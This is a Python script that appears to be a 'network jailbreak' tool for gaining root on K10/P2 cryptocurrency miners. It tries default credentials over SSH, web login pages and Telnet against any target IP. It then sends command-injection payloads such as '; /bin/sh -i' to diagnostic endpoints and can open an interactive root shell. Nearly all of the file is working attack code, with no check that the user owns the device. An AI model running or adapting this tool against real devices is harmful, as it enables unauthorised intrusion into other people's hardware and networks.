"""
Method A: Network-Based Credential Exploitation

Non-invasive jailbreak via default credentials and network services.

Attempts:
1. SSH with default credentials
2. Web UI login with credential injection
3. Telnet fallback
4. Command injection via web diagnostics
"""

import socket
import paramiko
import requests
import yaml
from pathlib import Path
from typing import Optional, Dict, List, Tuple
from urllib.parse import urljoin
import time


class NetworkJailbreak:
    """Network-based privilege escalation for K10/P2 miners."""

    def __init__(self, target_ip: str, credentials_file: Optional[Path] = None):
        """
        Initialize network jailbreak tool.

        Args:
            target_ip: IP address of the target miner
            credentials_file: Path to credentials YAML (default: config/default_credentials.yaml)
        """
        self.target_ip = target_ip
        self.credentials_file = credentials_file or Path(__file__).parent.parent / "config" / "default_credentials.yaml"
        self.credentials = self._load_credentials()
        self.session = None

    def _load_credentials(self) -> Dict:
        """Load credential database from YAML."""
        with open(self.credentials_file, 'r') as f:
            return yaml.safe_load(f)

    def attempt_ssh(self, timeout: int = 10) -> Optional[paramiko.SSHClient]:
        """
        Attempt SSH login with default credentials.

        Args:
            timeout: Connection timeout in seconds

        Returns:
            Authenticated SSH client or None
        """
        print(f"[*] Attempting SSH access to {self.target_ip}:22")

        for cred in self.credentials['ssh_credentials']:
            username = cred['username']
            password = cred['password']
            prob = cred['probability']

            print(f"[+] Trying {username}:{password if password else '(blank)'} (probability: {prob})")

            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                client.connect(
                    self.target_ip,
                    port=22,
                    username=username,
                    password=password,
                    timeout=timeout,
                    allow_agent=False,
                    look_for_keys=False
                )

                # Verify root access
                stdin, stdout, stderr = client.exec_command('whoami')
                user = stdout.read().decode().strip()

                if user == 'root':
                    print(f"[✓] SUCCESS! Root access via SSH ({username}:{password if password else '(blank)'})")
                    return client
                else:
                    print(f"[!] Login successful but not root (user: {user})")
                    client.close()

            except paramiko.AuthenticationException:
                print(f"[x] Authentication failed")
            except paramiko.SSHException as e:
                print(f"[x] SSH error: {e}")
            except socket.timeout:
                print(f"[x] Connection timeout")
            except Exception as e:
                print(f"[x] Unexpected error: {e}")

        print("[!] All SSH credentials exhausted")
        return None

    def attempt_web_ui(self, timeout: int = 5) -> Optional[requests.Session]:
        """
        Attempt web UI login with default credentials.

        Args:
            timeout: HTTP timeout in seconds

        Returns:
            Authenticated session or None
        """
        print(f"[*] Attempting Web UI access to {self.target_ip}")

        # Try both HTTP and HTTPS
        schemes = ['http', 'https']

        for scheme in schemes:
            base_url = f"{scheme}://{self.target_ip}"
            print(f"[+] Trying {base_url}")

            for cred in self.credentials['web_interface']:
                username = cred['username']
                password = cred['password']

                try:
                    session = requests.Session()
                    session.verify = False  # Ignore SSL errors

                    # Common login endpoints
                    login_endpoints = [
                        '/login',
                        '/api/login',
                        '/cgi-bin/login.cgi',
                        '/index.php',
                    ]

                    for endpoint in login_endpoints:
                        url = urljoin(base_url, endpoint)

                        # Try POST login
                        data = {
                            'username': username,
                            'password': password,
                            'user': username,
                            'pass': password,
                            'login': 'Login',
                        }

                        response = session.post(url, data=data, timeout=timeout, allow_redirects=True)

                        # Check for success indicators
                        if any(indicator in response.text.lower() for indicator in ['dashboard', 'logout', 'settings', 'miner', 'pool']):
                            print(f"[✓] SUCCESS! Web UI access ({username}:{password})")
                            self.session = session
                            return session

                except requests.exceptions.Timeout:
                    print(f"[x] {scheme.upper()} timeout")
                    break
                except requests.exceptions.ConnectionError:
                    print(f"[x] {scheme.upper()} connection refused")
                    break
                except Exception as e:
                    print(f"[x] Error: {e}")

        print("[!] Web UI login failed")
        return None

    def attempt_command_injection(self) -> bool:
        """
        Attempt command injection via web UI diagnostic tools.

        Requires active web session from attempt_web_ui().

        Returns:
            True if injection successful
        """
        if not self.session:
            print("[!] No active web session. Run attempt_web_ui() first.")
            return False

        print("[*] Attempting command injection via diagnostics")

        base_url = f"http://{self.target_ip}"

        # Common diagnostic endpoints
        diagnostic_endpoints = [
            '/cgi-bin/ping.cgi',
            '/cgi-bin/traceroute.cgi',
            '/api/diagnostics',
            '/diagnostics',
            '/tools/ping',
        ]

        # Injection payloads
        payloads = [
            '; /bin/sh -i',
            '| /bin/sh -i',
            '`/bin/sh -i`',
            '127.0.0.1; echo "INJECTION_TEST"',
        ]

        for endpoint in diagnostic_endpoints:
            url = urljoin(base_url, endpoint)

            for payload in payloads:
                try:
                    data = {
                        'ip': payload,
                        'host': payload,
                        'target': payload,
                    }

                    response = self.session.post(url, data=data, timeout=10)

                    # Check for command execution
                    if 'INJECTION_TEST' in response.text or 'sh:' in response.text:
                        print(f"[✓] Command injection successful at {endpoint}")
                        print(f"[+] Payload: {payload}")
                        return True

                except Exception as e:
                    pass

        print("[!] Command injection failed")
        return False

    def attempt_telnet(self, timeout: int = 10) -> Optional[str]:
        """
        Attempt Telnet login (legacy fallback).

        Args:
            timeout: Connection timeout

        Returns:
            Session info or None
        """
        print(f"[*] Attempting Telnet access to {self.target_ip}:23")

        try:
            import telnetlib

            for cred in self.credentials['telnet_credentials']:
                username = cred['username']
                password = cred['password']

                try:
                    tn = telnetlib.Telnet(self.target_ip, port=23, timeout=timeout)

                    tn.read_until(b"login: ", timeout=5)
                    tn.write(username.encode('ascii') + b"\n")

                    if password:
                        tn.read_until(b"Password: ", timeout=5)
                        tn.write(password.encode('ascii') + b"\n")

                    # Check for shell prompt
                    response = tn.read_some().decode('ascii', errors='ignore')

                    if any(prompt in response for prompt in ['#', '$', 'root@']):
                        print(f"[✓] SUCCESS! Telnet access ({username}:{password})")
                        return f"Telnet session active: {username}@{self.target_ip}"

                    tn.close()

                except Exception as e:
                    print(f"[x] Telnet error: {e}")

        except ImportError:
            print("[!] telnetlib not available")
        except Exception as e:
            print(f"[x] Telnet connection failed: {e}")

        print("[!] Telnet access failed")
        return None

    def run_full_attack(self) -> Dict[str, any]:
        """
        Run complete network-based jailbreak sequence.

        Returns:
            Dictionary with attack results
        """
        print("=" * 70)
        print(f"K10 Network Jailbreak - Target: {self.target_ip}")
        print("=" * 70)
        print()

        results = {
            'target': self.target_ip,
            'ssh_client': None,
            'web_session': None,
            'telnet_session': None,
            'command_injection': False,
            'success': False,
        }

        # Method 1: SSH
        ssh_client = self.attempt_ssh()
        if ssh_client:
            results['ssh_client'] = ssh_client
            results['success'] = True
            print("\n[✓] ROOT ACCESS ACHIEVED VIA SSH")
            return results

        print()

        # Method 2: Web UI
        web_session = self.attempt_web_ui()
        if web_session:
            results['web_session'] = web_session

            # Try command injection
            if self.attempt_command_injection():
                results['command_injection'] = True
                results['success'] = True
                print("\n[✓] ROOT ACCESS ACHIEVED VIA COMMAND INJECTION")
                return results

        print()

        # Method 3: Telnet
        telnet_session = self.attempt_telnet()
        if telnet_session:
            results['telnet_session'] = telnet_session
            results['success'] = True
            print("\n[✓] ROOT ACCESS ACHIEVED VIA TELNET")
            return results

        print()
        print("[!] All network-based methods exhausted")
        print("[!] Consider Method B (Offline Shadow Edit) or Method C (UART)")
        print("=" * 70)

        return results


# Command-line interface
if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='K10/P2 Network-Based Jailbreak (Method A)'
    )
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('--credentials', type=Path, help='Custom credentials YAML')
    parser.add_argument('--ssh-only', action='store_true', help='Only attempt SSH')

    args = parser.parse_args()

    jailbreak = NetworkJailbreak(args.target, args.credentials)

    if args.ssh_only:
        client = jailbreak.attempt_ssh()
        if client:
            print("\n[+] Dropping to interactive shell...")
            client.invoke_shell()
    else:
        results = jailbreak.run_full_attack()

        if results['ssh_client']:
            print("\n[+] SSH client available for interactive use")
